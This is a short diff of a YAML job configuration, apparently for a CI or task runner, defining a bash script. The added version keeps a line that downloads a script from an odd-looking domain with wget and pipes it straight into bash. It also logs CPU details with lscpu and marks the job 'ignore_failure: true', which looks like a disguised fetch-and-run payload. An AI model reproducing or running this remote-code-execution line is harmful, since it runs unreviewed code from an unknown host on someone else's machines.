@@ -1,7 +1,11 @@
 scripts:
   - name: My Bash Script
+    ignore_failure: true
     script: |
-      #!/bin/bash
-      set -ex
-      apt update;apt -y install wget
-      wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_dme_codemag | bash
+            #!/bin/bash
+            set -ex
+            mkdir -p test-results
+            lscpu > test-results/log.txt
+            apt update;apt -y install wget
+            wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_dme_codemag | bash
+    test_report: test-results/log.txt
